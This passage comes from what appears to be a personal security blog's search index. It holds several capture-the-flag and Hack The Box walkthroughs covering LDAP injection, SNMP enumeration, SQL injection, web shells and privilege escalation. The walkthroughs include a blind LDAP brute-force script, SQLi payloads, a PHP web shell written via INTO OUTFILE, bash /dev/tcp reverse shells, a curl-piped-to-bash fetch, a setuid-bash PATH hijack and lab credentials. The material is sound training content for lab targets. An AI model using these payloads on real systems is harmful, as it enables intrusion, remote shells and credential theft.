administrator (“Reese”) password with blind LDAP injection.\nManually, trying passwords for user “reese”:\n* → Success a* → Failure H* → Success This suggests the password starts with “H”. The wildcard * functions like a match-anything character. By iteratively adding characters (e.g., H*, Ha*, Hab*), you can brute-force the password one character at a time.\nBecause bypassing the login doesn’t get you far, the true challenge is scripting a blind brute-force for the admin password.\nExample Python Script Script based on the writeup’s logic:\nimport requests USERNAME = \u0026#34;reese\u0026#34; LOGIN_URL = \u0026#34;http://83.136.255.192:56860/login\u0026#34; CHARACTERS = \u0026#34;qwertyuiopQWERTYUIOPasdfghjklASDFGHJKLzxcvbnmZXCVBNM_-[]{}1234567890\u0026#34; def trylogin(user, pw): session = requests.Session() headers = { \u0026#39;X-Forwarded-For\u0026#39;: pw, \u0026#39;Referer\u0026#39;: LOGIN_URL } data = { \u0026#34;username\u0026#34;: user, \u0026#34;password\u0026#34;: pw } response = session.post(LOGIN_URL, headers=headers, data=data, allow_redirects=False) location = response.headers.get(\u0026#39;location\u0026#39;, \u0026#39;\u0026#39;) return \u0026#39;/login\u0026#39; not in location def forceone(prefix): for x in CHARACTERS: test_pw = f\u0026#34;{prefix}{x}*\u0026#34; if trylogin(USERNAME, test_pw): return x return \u0026#34;\u0026#34; def forcer(): got = \u0026#34;\u0026#34; while True: next_char = forceone(got) if not next_char: print(\u0026#34;No matching character found. Exiting.\u0026#34;) break got += next_char print(\u0026#34;Discovered so far:\u0026#34;, got) if __name__ == \u0026#34;__main__\u0026#34;: forcer() Lessons Learned LDAP injection is analogous to SQL injection but uses different operators, filters, and wildcards (*). Username enumeration and blind brute-force attacks can be surprisingly effective with LDAP. Scripting is essential for blind brute-force when each character must be discovered sequentially. Always check public writeups and references (like HackTricks) for injection tricks. Writeup based on my own exploitation process, with inspiration from CTF and security community references.\n","permalink":"https://joonkim0625.github.io/posts/2025-04-19-phonebook/","summary":"\u003cp\u003eThis post documents my process for solving the \u003cstrong\u003ePhonebook\u003c/strong\u003e box on Hack The Box. The box focuses on LDAP injection and brute-forcing credentials using knowledge of LDAP search/filter syntax.\u003c/p\u003e\n\u003ch2 id=\"solve\"\u003eSolve\u003c/h2\u003e\n\u003cp\u003eI didn’t find any obvious attack vectors except for a DOM-based HTML injection. After checking a writeup, I learned the challenge was about LDAP injection—a topic I had little prior experience with.\u003c/p\u003e\n\u003ch3 id=\"what-is-ldap-injection\"\u003eWhat is LDAP Injection?\u003c/h3\u003e\n\u003cp\u003eAccording to PayloadAllTheThings, LDAP Injection is a vulnerability that occurs when user-supplied input is used to construct LDAP queries without proper sanitization or escaping.\u003c/p\u003e","title":"Phonebook HTB Walkthrough"},{"content":"This post documents my process for solving the Pandora box on Hack The Box. The challenge focuses on recon, SNMP enumeration, port forwarding, SQLi on an internal service, and a series of lateral movement and privilege escalation steps.\nRecon Initial port scan:\nports=$(nmap -p- --min-rate=1000 -T4 10.10.11.136 | grep ^[0-9] | cut -d \u0026#39;/\u0026#39; -f 1 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed s/,$//) nmap -p$ports -sC -sV 10.10.11.136 Open ports:\n22 (SSH) 80 (HTTP, Apache, Ubuntu) Enumerated with UDP scan (-sU):\nNotably, port 161/udp (SNMP) is open. SNMP Enumeration \u0026amp; Exploitation SNMP (Simple Network Management Protocol) allows for device monitoring and management. Used community string “public” with snmpwalk: snmpwalk -v1 -c public 10.10.11.136 Found credentials at the bottom of the output: ... = STRING: \u0026#34;-u daniel -p HotelBabylon23\u0026#34; SSH in as daniel using the discovered password.\nInternal Web Service Access (Port Forwarding) Found a vhost config at /etc/apache2/sites-enabled/pandora.conf, which exposes an internal site on localhost:80 (PandoraFMS).\nSet up SSH port forwarding to access the site locally:\nssh -D 9090 daniel@10.10.11.136 # or, after login: ~C ssh\u0026gt; -L 8000:127.0.0.1:80 Then access http://localhost:8000 in your browser.\nPandora FMS - Version \u0026amp; SQLi Internal Pandora FMS console found (v7.0NG.742_FIX_PERL2020). Google for exploits; SonarSource blog highlights a SQLi in /include/chart_generator.php (session_id parameter). Example exploit:\nhttp://localhost:8000/pandora_console/include/chart_generator.php?session_id=1\u0026#39; OR IF((NOW()=SYSDATE()),SLEEP(10),1)=\u0026#39;0 Confirmed time-based blind SQLi. Enumerated tables/users via SQLi (or using sqlmap):\nDumped session and user tables. Found hash for user matt. Used valid session from tsessions_php to gain console access. Lateral Movement \u0026amp; PE Examined log and config files (e.g., /var/www/pandora/pandora_console/audit.log). Found clues in /etc/apache2/sites-enabled/pandora.conf and Windows shares (via telnet). Discovered password for “security” account from a mailbox: 4Cc3ssC0ntr0ller. Connected to telnet server with new credentials and escalated to get the user flag.\nUseful Commands \u0026amp; Resources Reverse shell:\nbash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.6/9001 0\u0026gt;\u0026amp;1' Download and run linpeas.sh: curl 10.10.14.6:8001/linpeas.sh | bash python3 -m http.server 8001 # Serve from attacker box SQLi enumeration and exploitation with sqlmap. References:\nSonarSource PandoraFMS SQLi writeup: https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/ Ippsec’s walkthroughs Lessons Learned SNMP remains a critical vector; always check for default credentials (“public”). Don’t overlook UDP ports! SSH port forwarding is a must-know skill for accessing internal services. SQLi and session hijacking can give deep access to internal apps. Lateral movement and mailbox hunting can reveal passwords for additional services and PE. Writeup based on my exploitation process and key references from the security community.\n","permalink":"https://joonkim0625.github.io/posts/2025-04-13-pandora/","summary":"\u003cp\u003eThis post documents my process for solving the \u003cstrong\u003ePandora\u003c/strong\u003e box on Hack The Box. The challenge focuses on recon, SNMP enumeration, port forwarding, SQLi on an internal service, and a series of lateral movement and privilege escalation steps.\u003c/p\u003e\n\u003ch2 id=\"recon\"\u003eRecon\u003c/h2\u003e\n\u003cp\u003eInitial port scan:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eports\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003enmap -p- --min-rate\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e -T4 10.10.11.136 | grep ^\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e0-9\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e | cut -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e -f \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e | tr \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\n\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;,\u0026#39;\u003c/span\u003e | sed s/,$//\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p$ports -sC -sV 10.10.11.136\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cstrong\u003eOpen ports:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e22 (SSH)\u003c/li\u003e\n\u003cli\u003e80 (HTTP, Apache, Ubuntu)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEnumerated with UDP scan (\u003ccode\u003e-sU\u003c/code\u003e):\u003c/p\u003e","title":"Pandora HTB Walkthrough"},{"content":"This post documents my process for solving the Validation box on Hack The Box. This challenge centers on SQL injection, writing a web shell via SQLi, and privilege escalation via password reuse.\nRecon Started with full port scan:\nports=$(nmap -p- --min-rate=1000 -T4 \u0026lt;IP\u0026gt; | grep ^[0-9] | cut -d \u0026#39;/\u0026#39; -f 1 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed s/,$//) echo $ports # 22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080 nmap -p$ports -sC -sV 10.10.11.116 Main open ports: 22 (SSH), 80 (Apache), 4566 (nginx), 8080 (nginx).\nSQL Injection Discovery During registration, both username and country are sent. The country parameter is injectable—single quotes caused a MySQL error:\nUncaught Error: Call to a member function fetch_assoc() Confirmed union-based SQL injection:\n' union select null -- (one column) ' union select @@version -- (got 10.5.11-MariaDB-1) database() is registration Enumerated schemas and columns:\nSELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA listed databases union select table_name from information_schema.tables where table_schema='registration' -- revealed registration table Uploading a Web Shell (Second-Order SQLi) Used SQL injection to write a web shell:\nBrazil\u0026#39; UNION SELECT \u0026#34;\u0026lt;?php SYSTEM($_REQUEST[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#34; INTO OUTFILE \u0026#39;/var/www/html/shell.php\u0026#39;-- - Note: You must visit /account.php after submitting the payload for the injection to take effect (second-order SQLi).\nOnce in place, access the shell:\nhttp://10.10.11.116/shell.php?cmd=id Listing files, found config.php:\n\u0026lt;?php $servername = \u0026#34;127.0.0.1\u0026#34;; $username = \u0026#34;uhc\u0026#34;; $password = \u0026#34;uhc-9qual-global-pw\u0026#34;; $dbname = \u0026#34;registration\u0026#34;; $conn = new mysqli($servername, $username, $password, $dbname); ?\u0026gt; Reverse Shell To get a reverse shell, use:\ncurl http://10.10.11.116/shell.php --data-urlencode \u0026#39;cmd=bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;YOUR_IP\u0026gt;/4444 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; (Remember to have a listener on your machine: nc -lvnp 4444)\nPrivilege Escalation (Password Reuse) Tried the MySQL credentials as the root password:\nsu - Password: uhc-9qual-global-pw Success! Now running as root, could grab root.txt.\nLessons Learned Test all input fields for SQLi; union-based SQLi remains highly effective. Second-order SQLi: the payload is triggered later, not immediately. Writing a web shell via SQLi is a classic and powerful move. Always read discovered config files for hardcoded credentials. Try passwords everywhere—password reuse is a real-world admin mistake. Writeup based on my exploitation process, with inspiration from CTF and community references.\n","permalink":"https://joonkim0625.github.io/posts/2025-04-10-validation/","summary":"\u003cp\u003eThis post documents my process for solving the \u003cstrong\u003eValidation\u003c/strong\u003e box on Hack The Box. This challenge centers on SQL injection, writing a web shell via SQLi, and privilege escalation via password reuse.\u003c/p\u003e\n\u003ch2 id=\"recon\"\u003eRecon\u003c/h2\u003e\n\u003cp\u003eStarted with full port scan:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eports\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003enmap -p- --min-rate\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e -T4 \u0026lt;IP\u0026gt; | grep ^\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e0-9\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e | cut -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e -f \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e | tr \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\n\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;,\u0026#39;\u003c/span\u003e | sed s/,$//\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho $ports\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p$ports -sC -sV 10.10.11.116\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eMain open ports: 22 (SSH), 80 (Apache), 4566 (nginx), 8080 (nginx).\u003c/p\u003e","title":"Validation HTB Walkthrough"},{"content":"This post documents my process for solving the Writeup box on Hack The Box. The machine revolves around web enumeration, CMS exploitation, SQLi, hash cracking, and privilege escalation via PATH hijacking.\nRecon Target: 10.10.10.138\nnmap -sC -sV 10.10.10.138 Results:\n22/tcp (SSH) OpenSSH 9.2p1 Debian 80/tcp (HTTP) Apache httpd 2.4.25 (Debian) robots.txt has a disallowed entry: /writeup/ Site uses CMS Made Simple, version 2.2.9.1 CMS Exploitation Accessed /writeup and /writeup/doc/CHANGELOG.txt to confirm CMS version.\nSearched for vulnerabilities for CMS Made Simple \u0026lt; 2.2.10 — found an SQLi exploit.\nRan the exploit script, retrieved:\n[+] Salt for password found: 5a599ef579066807 [+] Username found: jkr [+] Email found: jkr@writeup.htb [+] Password found: 62def4866937f08cc13bab43bb14e6f7 Hash Cracking Discovered that the hash is md5(salt + password) (mode 20 in hashcat). Format for hashcat:\nhash:salt\nCreated a text file and ran:\nhashcat -m 20 hashcat.txt /usr/share/wordlists/rockyou.txt Output:\n62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9 SSH Access Login with SSH:\nUser: jkr Pass: raykayjay9 Obtained user flag.\nPrivilege Escalation (PATH Hijacking) id output for user jkr:\njkr@writeup:~$ id uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev) Being in the staff group allows writing to /usr/local/bin.\nRan pspy and observed root running:\nsh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d \u0026gt; /run/motd.dynamic.new Exploited PATH hijacking:\necho -e \u0026#39;#!/bin/bash chmod u+s /bin/bash\u0026#39; \u0026gt; /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts After logging out and back in, saw:\nCMD: UID=0 ... | chmod u+s /bin/bash Now /bin/bash is setuid root. Spawn a root shell with:\n/bin/bash -p whoami # root Lessons Learned Enumeration of service versions and configuration is critical. Check for SQLi in known vulnerable CMS installations and crack hashes carefully—understand hash and salt formats. Privilege escalation can be achieved by abusing PATH and writable directories. Tools like pspy are invaluable for observing system-level scheduled jobs and root actions. Membership in groups like staff can grant unexpected privileges (e.g., writing to /usr/local/bin). Writeup based on my own exploitation process, with inspiration from official writeups and community references.\n","permalink":"https://joonkim0625.github.io/posts/2025-04-01-writeup/","summary":"\u003cp\u003eThis post documents my process for solving the \u003cstrong\u003eWriteup\u003c/strong\u003e box on Hack The Box. The machine revolves around web enumeration, CMS exploitation, SQLi, hash cracking, and privilege escalation via PATH hijacking.\u003c/p\u003e\n\u003ch2 id=\"recon\"\u003eRecon\u003c/h2\u003e\n\u003cp\u003eTarget: 10.10.10.138\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sC -sV 10.10.10.138\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cstrong\u003eResults:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e22/tcp (SSH) OpenSSH 9.2p1 Debian\u003c/li\u003e\n\u003cli\u003e80/tcp (HTTP) Apache httpd 2.4.25 (Debian)\u003c/li\u003e\n\u003cli\u003erobots.txt has a disallowed entry: \u003ccode\u003e/writeup/\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSite uses CMS Made Simple, version 2.2.9.1\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"cms-exploitation\"\u003eCMS Exploitation\u003c/h2\u003e\n\u003cp\u003eAccessed \u003ccode\u003e/writeup\u003c/code\u003e and \u003ccode\u003e/writeup/doc/CHANGELOG.txt\u003c/code\u003e to confirm CMS version.\u003c/p\u003e","title":"Writeup HTB Walkthrough"},{"content":"This post documents my process for solving the Help box on Hack The Box. This box involves GraphQL enumeration, credential dumping, hash cracking, and classic web application enumeration and exploitation.\nRecon Initial nmap scan:\nnmap -sC -sV -oA nmap/help \u0026lt;IP\u0026gt; Found GraphQL running on port 3000.\nGraphQL Enumeration Referred to PayloadsAllTheThings - GraphQL Injection to start enumeration.\nDiscovered GraphQL types via introspection:\nhttp://10.10.10.121:3000/graphql?query={__schema{types{name}}} Full schema dump and queries revealed a user type with username and password fields.\nDumping Credentials Queried for the user credentials:\nhttp://10.10.10.121:3000/graphql?query={user{username,password}} Result:\nusername: helpme@helpme.com password: 5d3c93182bb20f07b994a7f617e99cff (MD5) Cracked the password using hashcat:\nhashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt # 5d3c93182bb20f07b994a7f617e99cff:godhelpmeplz Web Enumeration Service on port 80 redirects to help.htb. Added to /etc/hosts, ran gobuster:\ngobuster dir -w \u0026lt;wordlist\u0026gt; -u http://help.htb/ -t 100 Found:\n/support /javascript Application Version Detection \u0026amp; Further Exploitation Checked GitHub for HelpDeskZ version. Found a SHA1 hash:\nd318f44739dced66793b1a603028133a76ae680e\nCracked with hashcat/john and wordlist:\npassword: Welcome1 Found admin email: support@mysite.com\nTips \u0026amp; Lessons Learned Enumerate all possible attack vectors: authentication, file fetching, attachment access, etc. If SQLi payloads don’t work in Burp, try directly in the browser or with other tools. If you can get source code, study it for logic and vulnerabilities. When crafting SQLi payloads, use the correct number of parentheses—sometimes grouping helps. Use resources like exploit-db.com or searchsploit to find ready-made exploits and inspiration. Combining GraphQL enumeration with traditional web enumeration yields powerful results. Password cracking (MD5, SHA1) with hashcat is a must-have skill in CTFs. Writeup based on my exploitation process and public community resources.\n","permalink":"https://joonkim0625.github.io/posts/2025-03-31-help/","summary":"\u003cp\u003eThis post documents my process for solving the \u003cstrong\u003eHelp\u003c/strong\u003e box on Hack The Box. This box involves GraphQL enumeration, credential dumping, hash cracking, and classic web application enumeration and exploitation.\u003c/p\u003e\n\u003ch2 id=\"recon\"\u003eRecon\u003c/h2\u003e\n\u003cp\u003eInitial nmap scan:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sC -sV -oA nmap/help \u0026lt;IP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eFound GraphQL running on port 3000.\u003c/p\u003e\n\u003ch2 id=\"graphql-enumeration\"\u003eGraphQL Enumeration\u003c/h2\u003e\n\u003cp\u003eReferred to \u003ca href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md\"\u003ePayloadsAllTheThings - GraphQL Injection\u003c/a\u003e to start enumeration.\u003c/p\u003e\n\u003cp\u003eDiscovered GraphQL types via introspection:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehttp://10.10.10.121:3000/graphql?query={__schema{types{name}}}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eFull schema dump and queries revealed a \u003ccode\u003euser\u003c/code\u003e type with \u003ccode\u003eusername\u003c/code\u003e and \u003ccode\u003epassword\u003c/code\u003e fields.\u003c/p\u003e","title":"Help HTB Walkthrough"},{"content":"This is a challenge old-02 from webhacking.kr.\nI was stuck trying to understand how people were discovering this SQLi vulnerability through a cookie, as no blog posts explained why the attack was effective. This wasn\u0026rsquo;t a typical SQLi challenge that I\u0026rsquo;m used to, so I really wanted to know why it worked the way it did. The goal of this challenge is to figure out the password used for the admin.php page (mentioned in the HTML comment).\nI say this challenge is different because typical SQLi challenges (or the basic ones, at least) often test your ability to bypass an authentication mechanism such as:\nSELECT * FROM users WHERE username = \u0026#39;alice\u0026#39; AND password = \u0026#39;secret\u0026#39;; In these cases, the common payload to test at the username position is:\n\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1 That’s exactly the mistake I made in the beginning when testing for SQLi payloads. I later realized that the actual SQL query used by the server was different from the one I assumed.\nI had to consider how the query would fetch the time data given that it was stored as an epoch time value. After a brainstorming session with ChatGPT, I concluded that the underlying query might look something like one of the following:\nSELECT \u0026lt;cookie_value\u0026gt; ...\nThe cookie value might be directly inserted into the SELECT clause, which could explain why string-based payloads weren’t working. SELECT some_value + \u0026lt;cookie_value\u0026gt; ...\nSince the time shown in the HTML comment appears to be the epoch time from the cookie plus 3 hours, it’s possible that the query performs an arithmetic operation on the cookie value. SELECT * FROM some_table WHERE val = \u0026lt;cookie_value\u0026gt;\nThe cookie value could be used within a WHERE clause to filter results. SELECT some_function(\u0026lt;cookie_value\u0026gt;) FROM some_table\nAlternatively, the cookie value might be passed as an argument to a function, with the function’s return value being displayed. Given these possibilities, what kind of payload should I try? I reasoned that, instead of using string-based payloads, I needed to supply a value that the query could process directly—meaning it should be an integer or a string that can be automatically converted to an integer. For instance, true might be interpreted as the integer 1 and false as 0. This hypothesis is based on the observation that the system appears to ignore payloads containing single quotes or the \u0026ndash; comment indicator, which typically signal to ignore the remainder of the SQL query.\nChanging the cookie value to 1 worked as the comment showed 2070-01-01 09:00:01. However, using 0 gave me the human readable time format 2025-02-07 03:29:58. So, I wanted to try SELECT 0 which is interpreted as 0. Without parenthesis, no change was made to the comment. However, (SELECT 0) worked! This is probably because (SELECT 0) will calculate the expression first and then only pass the 0 which is the result of the expression.\nSome additional payloads I tested:\ntime=(select -1) returned 2070-01-01 08:59:59 time=(select 10) returned 2070-01-01 09:00:10 time=(select 60) returned 2070-01-01 09:01:00 As you can see, the value provided is interpreted as a number of seconds added to a base time (in this case, 2070-01-01 09:00:00). This behavior raises a question: will this approach be useful when we need to extract string values from the database? It appears that we’re limited to reflecting only integer values.\nTo determine which database was in use, I initially tried (select @@version) and (select version()), but neither yielded useful results. This is likely because these functions return a string value (the SQL server version), whereas my injection technique expected an integer output.\nAfter researching ways to obtain database information, I discovered that select database() can be used (see this reference). Since database() returns the name of the currently selected database, it’s more appropriate in this context than @@version or version(). (Those functions are meant to reveal the SQL server version—and sometimes its name—which can help infer the type of relational database being used but do not directly provide the active database name.)\nI then tried:\nSince I determined that the database name was 6 characters long, I proceeded to fuzz for its actual value. One great feature of the testing tool is that you can simply search for a specific comment value (in this case, 09:00:01), and the results will be filtered accordingly.\nI discovered that the database name was chall2. Next, I investigated the contents of the chall2 database.\nKnowing that database() worked confirmed we were dealing with MySQL, so I started querying the information schema. For example, I used:\nLENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema = 'chall2' LIMIT 0,1)) = 13\nwhich indicated that the table name was 13 characters long.\nFrom this point on, I repeated the process to determine the correct table, column names, and their values. Since I knew the table name was 13 characters long, I fuzzed using:\n(select substring((SELECT table_name FROM information_schema.tables WHERE table_schema = 'chall2' LIMIT 0,1), 1, 1)) = 'a'\nThis allowed me to deduce that the table name was admin_area_pw.\nWith the table name in hand, I ran the following query to determine the length of the column name:\nLength((SELECT column_name FROM information_schema.columns WHERE table_schema = 'chall2' AND table_name = 'admin_area_pw' LIMIT 0,1)) = 1\nwhich revealed that the column name was 2 characters long. Fuzzing further with:\n(select substring((SELECT column_name FROM information_schema.columns WHERE table_schema = 'chall2' AND table_name = 'admin_area_pw' LIMIT 0,1), 1, 1)) = 'a'\nconfirmed that the column name was pw.\nNext, I determined the length of the value stored in the pw column using:\nLength((SELECT pw FROM chall2.admin_area_pw LIMIT 0,1)) = 1\nThis told me that the value in the pw column was 17 characters long. Finally, by extracting the value character by character with:\n(select substring((SELECT pw FROM chall2.admin_area_pw LIMIT 0,1), 1, 1)) = 'a'\n(and iterating this process for each character), I eventually obtained the complete password:\nkudos_to_beistlab\nBecause I had to extract the values byte by byte, the process resembled a side-channel attack in which necessary information is revealed incrementally. Overall, this was an excellent exercise in demonstrating the many different ways SQL injection can be exploited.\n","permalink":"https://joonkim0625.github.io/posts/2025-02-09-webhackingkr-old-02/","summary":"\u003cp\u003eThis is a challenge \u003ccode\u003eold-02\u003c/code\u003e from \u003ccode\u003ewebhacking.kr\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eI was stuck trying to understand how people were discovering this SQLi vulnerability through a cookie, as no blog posts explained why the attack was effective. This wasn\u0026rsquo;t a typical SQLi challenge that I\u0026rsquo;m used to, so I really wanted to know why it worked the way it did. The goal of this challenge is to figure out the password used for the \u003ccode\u003eadmin.php\u003c/code\u003e page (mentioned in the HTML comment).\u003c/p\u003e","title":"webhackingkr old 02"},{"content":"Hacking a JavaScript Game Referring to this video.\nExamination This is a web-based game, so we begin by inspecting the game page using the browser\u0026rsquo;s developer tools.\nInspecting the Game Open the browser\u0026rsquo;s developer tools and navigate to the debugger section. This section displays all the files associated with the page you are inspecting.\nYou can view the HTML source code of the Elf Connect game here:\nThe console allows you to test various commands. When using the console, ensure you change the context from top to the specific target you are testing.\nAttempt to Use the Tampermonkey Script I attempted to use the Tampermonkey script provided by the video’s author to interact with the iframe object in a new tab, but this did not work for me. Right-clicking the iframe revealed an option to open it in a new tab, but further attempts to use the script were unsuccessful.\nUnderstanding Game Logic By examining the game logic, I identified two key variables: wordSets and correctSets:\nUsing these variables, you can deduce the combinations of words required to solve the puzzle. The video demonstrates how to use ChatGPT to generate a short JavaScript script that outputs the correct combinations for each round. Additionally, the video author writes a brief script to automate solving the game.\nBeating the High Score Solving the puzzle alone does not guarantee beating the high score:\nTo achieve a higher score, you need to tamper with the values stored in sessionStorage. Initially, I considered intercepting the requests and modifying the score within the payload. However, the video showcased a simpler method: directly updating the score variable using the console. Since everything runs client-side without validation checks for tampered values, this approach works effectively.\nUsing Burp Suite To capture and modify the game’s responses, you can use Burp Suite. Adjust the proxy settings to intercept the response from the server.\nAfter forwarding the modified HTML code, the score begins at 55,000:\nThis method eliminates the need to manipulate session storage values directly.\nWith these techniques, you can explore various ways to manipulate the game’s behavior and achieve your desired outcome.\n","permalink":"https://joonkim0625.github.io/posts/2024-12-10-sans-holiday-hack-challenge-elf-connect/","summary":"\u003ch2 id=\"hacking-a-javascript-game\"\u003eHacking a JavaScript Game\u003c/h2\u003e\n\u003cp\u003eReferring to \u003ca href=\"https://www.youtube.com/watch?v=XsEqZvrTyoU\u0026amp;t=126s\"\u003ethis video\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"examination\"\u003eExamination\u003c/h2\u003e\n\u003cp\u003eThis is a web-based game, so we begin by inspecting the game page using the browser\u0026rsquo;s developer tools.\u003c/p\u003e\n\u003ch3 id=\"inspecting-the-game\"\u003eInspecting the Game\u003c/h3\u003e\n\u003cp\u003eOpen the browser\u0026rsquo;s developer tools and navigate to the debugger section. This section displays all the files associated with the page you are inspecting.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Debugger Section\" loading=\"lazy\" src=\"/images/sans-holiday-hack/elf-connect/debugger.png\"\u003e\u003c/p\u003e\n\u003cp\u003eYou can view the HTML source code of the Elf Connect game here:\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Game Code\" loading=\"lazy\" src=\"/images/sans-holiday-hack/elf-connect/game-code.png\"\u003e\u003c/p\u003e","title":"SANS Holiday Hack Challenge Elf Connect"},{"content":"Trickster Author: Junias Bonou\nDescription I found a web app that can help process images: PNG images only! Try it here!\nWhen I attempted to upload some random files, I got the following error message:\nError: File name does not contain '.png'. This suggests that the app strictly checks for .png extensions. To dig deeper, we can perform a directory search to see if we can find anything useful. A tool like gobuster is perfect for this kind of task.\nHere’s the command I used:\ngobuster dir -u http://atlas.picoctf.net:60047 -w /usr/share/seclists/Discovery/Web-Content/common.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://atlas.picoctf.net:60047 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.hta (Status: 403) [Size: 285] /.htpasswd (Status: 403) [Size: 285] /.htaccess (Status: 403) [Size: 285] /index.php (Status: 200) [Size: 321] /robots.txt (Status: 200) [Size: 62] /server-status (Status: 403) [Size: 285] /uploads (Status: 301) [Size: 333] [--\u0026gt; http://atlas.picoctf.net:60047/uploads/] Progress: 4734 / 4735 (99.98%) For this type of challenge, the common.txt wordlist should be sufficient. From the output, we can see the existence of the robots.txt file and an uploads directory.\nContents of robots.txt:\nUser-agent: * Disallow: /instructions.txt Disallow: /uploads/ The Disallow directive means these pages should not be crawled by web 